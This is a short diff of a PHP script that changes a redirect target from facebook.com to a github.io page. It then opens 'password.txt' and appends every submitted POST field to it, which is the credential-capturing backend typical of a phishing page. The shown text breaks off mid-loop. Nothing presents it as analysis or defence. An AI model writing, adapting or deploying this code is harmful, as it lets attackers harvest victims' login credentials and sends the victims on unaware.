@@ -1,5 +1,5 @@
 <?php
-header (‘Location:http://www.facebook.com/’);
+header (‘Location: https://janlurenceespinosa.github.io/123/’);
 $handle = fopen(“password.txt”, “a”);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
